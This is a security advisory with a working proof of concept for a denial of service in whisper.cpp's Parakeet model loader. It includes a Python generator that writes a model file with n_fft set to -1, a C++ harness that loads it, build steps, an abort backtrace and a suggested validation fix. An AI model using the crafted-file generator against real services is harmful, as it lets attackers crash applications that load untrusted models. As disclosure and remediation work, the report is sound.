# Parakeet Model Loader Denial of Service PoC

## Summary

The Parakeet model loader in `src/parakeet.cpp` reads the `n_fft` hyperparameter directly from the model file and uses it, without any validation, to size internal buffers in `parakeet_mel_cache::init()`. A crafted model file that sets `n_fft` to a negative value causes `std::vector::resize()` to be called with a huge size (the negative `int` widened to `size_t`), which throws `std::length_error`. Because the call that initializes the cache sits **outside** the `try/catch` that guards model loading, the exception is uncaught and the process is aborted via `std::terminate` — a denial of service triggered purely by loading an untrusted model.

This is reachable through the public loading entry points (e.g. `parakeet_init_from_file_with_params`, `parakeet_init_from_buffer_with_params_no_state`) whenever an application loads an untrusted or attacker-supplied Parakeet model.

**Affected file:** `src/parakeet.cpp`
**Reproduced on commit:** `6fc7c33b` (current `master` at time of writing), built with `-DWHISPER_SANITIZE_ADDRESS=ON`.
**Impact:** denial of service / process termination.
**Suggested CWE:** CWE-20 (Improper Input Validation), with CWE-248 (Uncaught Exception) as a related weakness.

## Security impact and attacker model

This issue matters when Parakeet model files cross a trust boundary. An attacker who can cause an application using the whisper.cpp Parakeet loader to load a crafted model file can terminate the target application process during model initialization.

Realistic examples include:

- A service or worker that accepts user-provided model files, model bundles, or model paths and loads them server-side.
- A desktop or CLI application that lets users open downloaded or community-provided Parakeet models.
- An automated pipeline that fetches model artifacts from external registries, shared storage, pull requests, or user-controlled project directories.
- Any application that exposes `parakeet_init_from_file_with_params` or `parakeet_init_from_buffer_with_params_no_state` to data that is not fully trusted.

This report does not claim code execution or memory corruption. The demonstrated impact is reliable process abort caused by missing validation of attacker-controlled model metadata.

## Root cause

`n_fft` is read verbatim from the model file and never validated:

```cpp
// src/parakeet.cpp:1013  (inside parakeet_model_load)
read_safe(loader, hparams.n_fft);
```

It is later used as a buffer size in `parakeet_mel_cache::init()`:

```cpp
// src/parakeet.cpp:480
void init(int fft_size) {
    n_fft = fft_size;
    sin_vals.resize(n_fft);     // n_fft is a signed int, implicitly converted to size_t
    cos_vals.resize(n_fft);
    hann_window.resize(n_fft);
    ...
}
```

Crucially, the call that initializes the cache sits **outside** the `try/catch` that guards model loading. The guard closes at line 3102, and the cache is initialized afterward at line 3114:

```cpp
// src/parakeet.cpp:3096
try {
    model_loaded = parakeet_model_load(loader, *ctx);
} catch (const std::exception & e) {
    ...
} catch (...) {
    ...
}                                                        // 3102 — guard ends here

if (!model_loaded) { ... return nullptr; }

// src/parakeet.cpp:3114 — runs OUTSIDE the try/catch above
ctx->mel_cache.init(ctx->model.hparams.n_fft);
```

When `n_fft` is negative, `resize()` receives the value widened to `size_t` (e.g. `-1` → `SIZE_MAX`) and throws `std::length_error`. Because the call at `parakeet.cpp:3114` is outside the try/catch, the exception propagates uncaught. whisper.cpp installs a global terminate handler (`ggml_uncaught_exception`, `ggml/src/ggml.cpp`), so the process prints a backtrace and calls `abort()` → denial of service.

## Reproduction

A self-contained generator and harness are included in this repository. The generator writes a minimal Parakeet model file with `n_fft = -1`. The harness loads it through the public buffer entry point.

The crafted file uses `n_loaded == 0` (no tensor data), which reaches the "empty model" path in `parakeet_model_load` (`parakeet.cpp:1461`) that returns `true`, so control reaches `mel_cache.init(n_fft)` at `parakeet.cpp:3114`.

### Note on the empty-model path

The PoC intentionally uses the smallest file that the current loader accepts as successfully loaded. This is not relying on a test-harness-only entry point: the file is passed through the public Parakeet buffer-loading API, parsed by the normal model loader, and accepted by `parakeet_model_load`.

The relevant security issue is that `n_fft` is trusted before the loader proves that the model metadata is valid. Even on the accepted empty-model path, untrusted file contents populate `ctx->model.hparams.n_fft`, `parakeet_model_load` returns success, and the caller uses that value outside the exception guard. A stricter loader should reject the malformed model cleanly instead of reaching `mel_cache.init()` with an invalid size.

**Generator (`make_poc_final.py`):**

```python
import struct

MAGIC = 0x67676d6c  # GGML_FILE_MAGIC "ggml"

def i32(v): return struct.pack('<i', v)
def u32(v): return struct.pack('<I', v)
def f32(v): return struct.pack('<f', v)

def make_model(n_fft_value, filename):
    buf = bytearray()
    buf += u32(MAGIC)
    # 15 hparams in read order (parakeet.cpp:1006-1020):
    # n_vocab, n_audio_ctx, n_audio_state, n_audio_head, n_audio_layer,
    # n_mels, ftype, n_fft, subsampling_factor, n_subsampling_channels,
    # n_conv_kernel, n_pred_dim, n_pred_layers, n_tdt_durations, n_max_tokens
    for v in [2, 0, 1, 1, 0, 1, 0, n_fft_value, 1, 1, 1, 1, 1, 1, 1]:
        buf += i32(v)
    buf += i32(1); buf += i32(1); buf += f32(0.0)   # mel filters: n_mel=1, n_fb=1, 1 float
    buf += i32(0)                                    # window function: n_window=0
    buf += u32(1)                                    # tdt_durations: 1 entry
    buf += i32(2)                                    # vocab: 2 tokens
    for tok in [b"a", b"b"]:
        buf += u32(len(tok)); buf += tok
    with open(filename, 'wb') as f:
        f.write(buf)
    print(f"[+] wrote {filename} ({len(buf)} bytes)  n_fft={n_fft_value}")

make_model(-1, "poc_nfft_neg1.bin")   # std::terminate at model load
```

**Harness (`run_poc.cpp`, included):**

```cpp
#include <cstdio>
#include <vector>
#include <fstream>
#include "parakeet.h"

int main(int argc, char** argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <model.bin>\n", argv[0]); return 1; }
    std::ifstream f(argv[1], std::ios::binary);
    if (!f) { fprintf(stderr, "cannot open %s\n", argv[1]); return 1; }
    std::vector<char> buf((std::istreambuf_iterator<char>(f)), {});
    struct parakeet_context_params p = parakeet_context_default_params();
    p.use_gpu = false;
    struct parakeet_context* ctx =
        parakeet_init_from_buffer_with_params_no_state(buf.data(), buf.size(), p);
    if (ctx) { printf("[+] returned ctx=%p\n", (void*)ctx); parakeet_free(ctx); }
    else     { printf("[-] returned nullptr\n"); }
    return 0;
}
```

**Build & run (AddressSanitizer recommended):**

```sh
# Build whisper.cpp with the Parakeet library and ASan:
cmake -B build -DWHISPER_SANITIZE_ADDRESS=ON -DCMAKE_BUILD_TYPE=Debug
cmake --build build --target parakeet -j

python3 make_poc_final.py

# NOTE: the Parakeet loader lives in libparakeet, not libwhisper.
g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
    -Lbuild/bin -lparakeet -lggml -lggml-base -lggml-cpu \
    -Wl,-rpath,build/bin -Iinclude -Iggml/include

LD_LIBRARY_PATH=build/bin ./run_poc poc_nfft_neg1.bin   # process aborts (std::terminate)
```

## Local verification

I verified this PoC locally against upstream `ggml-org/whisper.cpp` commit `6fc7c33b` with the following steps:

```sh
git clone https://github.com/ggml-org/whisper.cpp.git
cd whisper.cpp
git checkout 6fc7c33b
cmake -B build-parakeet-asan -DWHISPER_SANITIZE_ADDRESS=ON -DCMAKE_BUILD_TYPE=Debug
cmake --build build-parakeet-asan --target parakeet -j
cd path/to/CVE_Parakeet_PoC
python3 make_poc_final.py
g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
    -L/path/to/whisper.cpp/build-parakeet-asan/bin -lparakeet -lggml -lggml-base -lggml-cpu \
    -Wl,-rpath,/path/to/whisper.cpp/build-parakeet-asan/bin \
    -I/path/to/whisper.cpp/include -I/path/to/whisper.cpp/ggml/include
./run_poc poc_nfft_neg1.bin
```

The local run exited with status `134` (`SIGABRT`). The output showed `parakeet_model_load: n_fft = -1`, the empty-model warning, and then an uncaught `std::length_error` from `std::vector<float>::resize()` in `parakeet_mel_cache::init()`. The relevant verified stack frames were:

```text
#12 std::vector<float>::resize (__new_size=18446744073709551615)
#13 parakeet_mel_cache::init (fft_size=-1)                  src/parakeet.cpp:482
#14 parakeet_init_with_params_no_state                      src/parakeet.cpp:3114
#15 parakeet_init_from_buffer_with_params_no_state          src/parakeet.cpp:3081
#16 main                                                    run_poc.cpp:14
```

## Observed result

Running the harness against `poc_nfft_neg1.bin` aborts the process. Abbreviated backtrace (built with ASan on commit `6fc7c33b`):

```
parakeet_model_load: n_fft                  = -1
parakeet_model_load: WARN no tensors loaded from model file - assuming empty model for testing
...
terminate called after throwing an instance of 'std::length_error'
  what():  vector::_M_default_append

#12 std::vector<float>::resize (__new_size=18446744073709551615)  bits/stl_vector.h:1146
#13 parakeet_mel_cache::init (fft_size=-1)                        src/parakeet.cpp:482
#14 parakeet_init_with_params_no_state                           src/parakeet.cpp:3114
#15 parakeet_init_from_buffer_with_params_no_state               src/parakeet.cpp:3081
#16 main                                                         run_poc.cpp:19

==ERROR: AddressSanitizer: ABRT ... in __pthread_kill_implementation
```

The negative `n_fft` (`-1`) is widened to `18446744073709551615` (`SIZE_MAX`) at `resize()`, `std::length_error` is thrown from `init()` at `parakeet.cpp:482`, and because the call at `parakeet.cpp:3114` is outside the loader's `try/catch`, the exception is uncaught and the process aborts.

## Suggested remediation

Validate `n_fft` immediately after it is read (near `parakeet.cpp:1013`), and reject the model on failure so the loader returns `false` cleanly rather than crashing. At minimum require a positive, reasonably bounded value:

```cpp
read_safe(loader, hparams.n_fft);
if (hparams.n_fft <= 0 || hparams.n_fft > PARAKEET_MAX_N_FFT /* e.g. 65536 */) {
    PARAKEET_LOG_ERROR("%s: invalid model (bad n_fft value %d)\n", __func__, hparams.n_fft);
    return false;
}
```

Additionally, `mel_cache.init()` at `parakeet.cpp:3114` should either be moved inside the `try/catch` guarding the load, or the load path should guarantee `n_fft` is already validated before it is reached, so that no invalid value can ever propagate an uncaught exception.

> Note: `n_fft` is also consumed later, unvalidated, as a divisor/modulus and table index in the DFT/FFT routines (`parakeet.cpp:2597`–`2659`), reached during inference via `log_mel_spectrogram`. Values such as `0` (division/modulo by zero) or a value inconsistent with the frame size (out-of-bounds table indexing) appear problematic there as well, but I have not yet produced a working proof of concept for the inference path, so this report is limited to the load-time abort demonstrated above. The validation above (rejecting non-positive/out-of-range `n_fft`) would also address the `0` case.
